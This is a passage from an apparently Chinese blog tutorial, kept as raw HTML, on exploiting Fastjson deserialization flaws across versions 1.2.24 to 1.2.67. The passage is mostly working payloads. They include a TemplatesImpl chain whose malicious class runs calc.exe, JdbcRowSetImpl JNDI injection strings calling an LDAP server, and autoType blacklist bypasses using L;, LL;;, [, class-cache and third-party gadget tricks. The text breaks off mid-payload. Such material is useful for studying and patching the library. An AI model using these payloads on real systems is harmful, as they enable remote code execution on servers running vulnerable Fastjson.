&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;[Person Object] name=&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot; full_name=&quot;</span> +</span><br><span class="line">            <span class="built_in">this</span>.full_name  + <span class="string">&quot;, age=&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;, prop=&quot;</span> + <span class="built_in">this</span>.prop + <span class="string">&quot;, sex=&quot;</span> +</span><br><span class="line">            <span class="built_in">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>测试序列化与反序列化</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">eneity3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson.Person\&quot;,\&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(eneity3,Person.class); <span class="comment">//输出会调用obj对象的toString函数</span></span><br><span class="line">System.out.println(obj);    </span><br></pre></td></tr></table></figure></div><p>输出结果</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=zhang full_name=<span class="literal">null</span>, age=<span class="number">18</span>, prop=<span class="literal">null</span>, sex=<span class="literal">null</span></span><br></pre></td></tr></table></figure></div><blockquote><p>从结果来看，成功通过反序列化赋值的属性只有name和age，而其中name因为是public因此可以直接赋值，full_name、sex、prop等private属性因为没有设置setter因此也赋值失败，age虽为private属性，但<code>public void setAge(int age)</code>被调用成功，因此被赋值</p><p>private sex getsex函数没有被调用,private prop getprop函数被成功调用</p><p>总结：</p><ul><li>反序列化赋值时，public属性直接赋值，private属性要调用setter</li><li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li></ul></blockquote><h3 id="parse过程"><a href="#parse过程" class="headerlink" title="parse过程"></a>parse过程</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241845.png"                      alt="image-20230810202238068"                ><figcaption>image-20230810202238068</figcaption></figure></p><h4 id="该过程中调用的setter方法要求"><a href="#该过程中调用的setter方法要求" class="headerlink" title="该过程中调用的setter方法要求"></a>该过程中调用的setter方法要求</h4><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><blockquote><p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名。再去跟这个类的属性去比对有没有这个名称的属性。</p><p>如果没有这个属性并且这个set方法的输入是一个布尔型，会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写(即isNa)，去寻找这个属性名。</p></blockquote><h4 id="该过程中调用的getter方法要求"><a href="#该过程中调用的getter方法要求" class="headerlink" title="该过程中调用的getter方法要求"></a>该过程中调用的getter方法要求</h4><ul><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Fastjson-lt-x3D-1-2-24"><a href="#Fastjson-lt-x3D-1-2-24" class="headerlink" title="Fastjson&lt;&#x3D;1.2.24"></a>Fastjson&lt;&#x3D;1.2.24</h2><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a><strong>TemplatesImpl</strong>利用链</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li><p>服务端使用parseObject()时，必须使用如下格式才能触发漏洞: JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</p></li><li><p>服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField);</p></li></ol><blockquote><p>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private 属性，服务端必须添加特性才回去从json中恢复private属性的数据。</p></blockquote><p>总体来说是直接反序列化TemplatesImpl,由于存在 Feature.SupportNonPublicField 设置(允许private对象传入)，反序列化的过程中会调用setValue，这里会把所有属性存储到filedInfo中，到outputProperties的时候，因为它是个类，存在 method，于是进入if分支，调用方法为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241981.png"                      alt="image-20230810204820756"                ><figcaption>image-20230810204820756</figcaption></figure></p><p>之后会调用newTransformer()</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241346.png"                      alt="image-20230810204854867"                ><figcaption>image-20230810204854867</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241715.png"                      alt="image-20230810204903707"                ><figcaption>image-20230810204903707</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241200.png"                      alt="image-20230810204916936"                ><figcaption>image-20230810204916936</figcaption></figure></p><blockquote><p>最后就是初始化类进而代码执行了</p></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>恶意类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Shell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span></span><br><span class="line">TransletException &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure></div><p>工具类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">FiletoBase64</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">io</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10240</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len = io.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        os.write(buf, <span class="number">0</span>, len);</span><br><span class="line">    &#125;</span><br><span class="line">    io.close();</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());</span><br><span class="line"><span class="keyword">return</span> s; &#125;</span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> ClassBase64Util.FiletoBase64(<span class="string">&quot;./Shell.class&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">payload1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(payload1);</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a><strong>JdbcRowSetImpl利用链</strong></h3><p>利用链分析:在设置AutoCommit属性时，调用setAutoCommit()方法，conn默认为空，进入else执行this.conn &#x3D; this.connect();</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241111.png"                      alt="image-20230810205442293"                ><figcaption>image-20230810205442293</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032242017.png"                      alt="image-20230810205413334"                ><figcaption>image-20230810205413334</figcaption></figure></p><p>conn默认为空，若this.getDataSourceName() !&#x3D; null则进入else if,调用至 lookup(this.getDataSourceName()</p><p>故此处存在JNDI注入，payload为:</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div><h2 id="1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41"><a href="#1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>开启autoTypeSupport,影响版本1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</p><h3 id="版本分析"><a href="#版本分析" class="headerlink" title="版本分析"></a>版本分析</h3><p>FastJSON1.2.24</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="built_in">this</span>.config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure></div><p>FastJSON1.2.25</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = <span class="built_in">this</span>.config.checkAutoType(ref, (Class)<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div><blockquote><p>加载类从TypeUtils.loadClass 变成了this.config.checkAutoType</p></blockquote><p>同时在1.2.25后<code>com.alibaba.fastjson.parser.ParserConfig</code>类加了属性</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> autoTypeSupport; <span class="comment">//控制是否可进行反序列化，默认为false</span></span><br><span class="line"><span class="keyword">private</span> String[] denyList; <span class="comment">//黑名单</span></span><br><span class="line"><span class="keyword">private</span> String[] acceptList; <span class="comment">//白名单</span></span><br></pre></td></tr></table></figure></div><blockquote><p>黑白名单在构造方法中赋值</p></blockquote><p>反序列化中也使用了<code>ParserConfig#checkAutoType()</code>,下图为com.alibaba.fastjson.parser.DefaultJSONParser中parseObject()方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032242548.png"                      alt="image-20230810210025230"                ><figcaption>image-20230810210025230</figcaption></figure></p><p>checkAutoType()中对autoTypeSupport进行判断</p><ul><li>若为true则先进行白名单校验，若为白名单内则进 入TypeUtils.loadClass，后再进行黑名单校验，若在黑名单中则抛出异常(autoType is not support …)，若未在黑名单中则在Map中查找类</li><li>若autoTypeSupport为false,则进行黑名单判断，再进行白名单判断，最后若autoTypeSupport&#x3D;true， 会再一次进行判断然后进入到TypeUtils.loadClass中</li></ul><p>com.alibaba.fastjson.util.TypeUtils#loadClass()中对[ L ;进行了处理，而其中在处理L ;的时候存在了逻 辑漏洞，可以在className的前后分别加上L ;来进行绕过</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032242965.png"                      alt="image-20230810211123310"                ><figcaption>image-20230810211123310</figcaption></figure></p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//开启autoTypeSupport</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:13 89/Basic/Command/calc&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>利用条件</p><ul><li>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</li><li>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.347 autoTypeSupport开启或未开启均可利用<ul><li>checkAutoType源码修改，若autoTypeSupport为true,当目标类在黑名单中，需要目标类不在map中才 会抛出异常</li></ul></li></ul><p>payload</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>其实就是传两个对象，解析两次，解析完第一个对象时会把com.sun.rowset.JdbcRowSetImpl驾到缓存map中，第二次时就可以直接获取到目标类</p><p>A的解释</p><ul><li><p>在MiscCodec#deserialze()方法中，会解析strVal(对应val的值),当clazz &#x3D;&#x3D; Class.class，调用 TypeUtils.loadClass(),此时strVal为val对应值,这样就可以把val中的类加载到缓存map（mappings）中</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123; <span class="comment">//当clazz == Class.class，调用 TypeUtils.loadClass(),此时strVal为val对应值</span></span><br><span class="line"><span class="keyword">return</span> TypeUtils.loadClass(strVal,parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul></blockquote><h2 id="Fastjson-x3D-1-2-42"><a href="#Fastjson-x3D-1-2-42" class="headerlink" title="Fastjson &#x3D; 1.2.42"></a><strong>Fastjson &#x3D; 1.2.42</strong></h2><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><p>Fastjson &lt;&#x3D; 1.2.42 开启autoTypeSupport</p><p>Fastjson1.2.42将黑名单由字符串直接比对改为了HashCode。checkAutoType()中在黑名单绕过的时候 做了一个校验，如果类名以L开头，;结尾，则会用stubstring()去除类名前的第一个L,<u>双写L即可绕过</u></p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//开启autoTypeSupport </span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1: 1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-43"><a href="#Fastjson-x3D-1-2-43" class="headerlink" title="Fastjson &#x3D; 1.2.43"></a><strong>Fastjson &#x3D; 1.2.43</strong></h2><h3 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h3><p>Fastjson &lt;&#x3D; 1.2.43开启autoTypeSupport</p><p>Fastjson &lt;&#x3D; 1.2.43，checkAutoType()对LL进行了判断，如果类以LL开头，抛出异常,但在 TypeUtils.loadClass中，还对[进行了处理，因此又可以通过[来进行绕过</p><p>TypeUtils#loadClass()</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//开启autoTypeSupport </span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span> [&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span> &#125;</span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-44"><a href="#Fastjson-x3D-1-2-44" class="headerlink" title="Fastjson &#x3D; 1.2.44"></a><strong>Fastjson &#x3D; 1.2.44</strong></h2><p>修复了[的绕过，在checkAutoType中进行判断如果类名以[或L开头抛出异常。L[让绕 过方法失效，可使用JSON内置payload</p><h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-47"><a href="#Fastjson-x3D-1-2-47" class="headerlink" title="Fastjson &#x3D; 1.2.47"></a><strong>Fastjson &#x3D; 1.2.47</strong></h2><h3 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport<br>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 autoTypeSupport开启或未开启均可利用</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67（要有依赖）"><a href="#1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67（要有依赖）" class="headerlink" title="1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67（要有依赖）"></a><strong>1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67</strong>（要有依赖）</h2><p>Fastjson1.2.48修复JSON内置绕过方法，此版本内多为针对黑名单绕过，需要相应组件才可使用</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>&lt;&#x3D;1.2.62</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//依赖</span></span><br><span class="line"><span class="comment">// &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">//          &lt;version&gt;x.x&lt;/version&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/dependency&gt;</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;ldap://127.0.</span></span><br><span class="line"><span class="string">0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure></div><p>fastjson &lt;&#x3D; 1.2.66黑名单绕过，需autoTypeSupport属性为true</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;proper</span></span><br><span class="line"><span class="string">ties:</span></span><br><span class="line"><span class="string">&#123;&quot;</span><span class="meta">@type</span><span 